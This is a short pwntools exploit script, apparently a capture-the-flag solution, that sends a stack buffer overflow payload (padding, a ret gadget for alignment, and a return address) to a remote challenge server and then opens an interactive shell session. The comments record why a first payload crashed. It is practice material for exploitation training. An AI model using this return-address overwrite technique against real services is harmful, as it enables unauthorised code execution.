from pwn import *
context.log_level = 'debug'
conn = remote('node4.buuoj.cn', 26706)
#conn = process("./pwn1")
#gdb.attach(conn, 'b start')
ret = 0x401198


# try paylaod = b'a' * (0xf + 0x8) + p64(vul)
# return error "timeout: the monitored command dumped core"
# add one or more ret commond
payload = b'a' * (0xf + 0x8)  + p64(ret) + p64(0x401186)

conn.sendline(payload)

conn.interactive()
